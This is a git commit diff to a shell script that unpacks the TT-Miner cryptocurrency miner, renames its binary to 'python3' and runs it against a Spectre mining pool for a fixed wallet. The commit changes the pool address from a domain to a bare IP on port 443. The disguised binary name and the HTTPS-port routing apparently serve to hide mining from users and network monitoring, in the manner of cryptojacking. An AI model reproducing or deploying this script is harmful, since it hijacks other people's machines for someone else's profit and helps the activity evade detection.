130ca696a96950e60f573580aa90eac8dc8afad6
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-27 04:50:39 +0700

    Update spectt.sh

--- spectt.sh
+++ spectt.sh
@@ -3,4 +3,4 @@ tar -xvf Dot
 cd TT-Miner-2024.3.2
 mv TT-Miner python3
 chmod +x python3
-./python3 -a spectrex -P spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.luck@spr.tw-pool.com:14001
+./python3 -a spectrex -P spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.luck@103.120.18.73:443
